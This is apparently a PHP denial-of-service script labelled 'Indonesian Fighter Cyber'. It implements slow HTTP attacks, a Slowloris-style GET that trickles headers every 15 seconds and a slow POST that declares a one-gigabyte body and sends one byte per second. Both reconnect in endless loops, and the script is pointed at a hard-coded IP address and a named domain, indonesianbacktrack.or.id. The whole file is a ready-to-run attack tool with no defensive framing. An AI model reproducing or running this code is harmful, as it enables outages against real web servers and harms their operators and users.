<?php

////////////////////////////////
//---(Indonesian Fighter Cyber)---
///////////////////////////////

set_time_limit(0);

$xserver = "103.28.149.106";
$xhost = "indonesianbacktrack.or.id";
$xprocess = 1;

function attack_get($server, $host){

$request = "GET / HTTP/1.1\r\n";

$request .= "Host: $host\r\n";

$request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";

$request .= "Keep-Alive: 900\r\n";

$request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";

$request .= "Accept: *.*\r\n";

$request .= "X-a: " . rand(1, 10000) . "\r\n";

$sockfd = @fsockopen($server, 80, $errno, $errstr);

@fwrite($sockfd, $request);

while (true){

if (@fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n")){

echo ".";

sleep(15);

}else{

echo "die\n";

$sockfd = @fsockopen($server, 80, $errno, $errstr);

@fwrite($sockfd, $request);

}

}

}

function attack_post($server, $host){

$request = "POST /".md5(rand())." HTTP/1.1\r\n";

$request .= "Host: $host\r\n";

$request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";

$request .= "Keep-Alive: 900\r\n";

$request .= "Content-Length: 1000000000\r\n";

$request .= "Content-Type: application/x-www-form-urlencoded\r\n";

$request .= "Accept: *.*\r\n";

$sockfd = @fsockopen($server, 80, $errno, $errstr);

@fwrite($sockfd, $request);

while (true){

if (@fwrite($sockfd, ".") !== FALSE){

echo ".";

sleep(1);

}else{

echo "d\n";

$sockfd = @fsockopen($server, 80, $errno, $errstr);

@fwrite($sockfd, $request);

}

}

}

for ($i = 0; $i < $xprocess; $i++){

//pilih salah satu...!
//attack_get($xserver, $xhost);
attack_post($xserver, $xhost); 

}

?>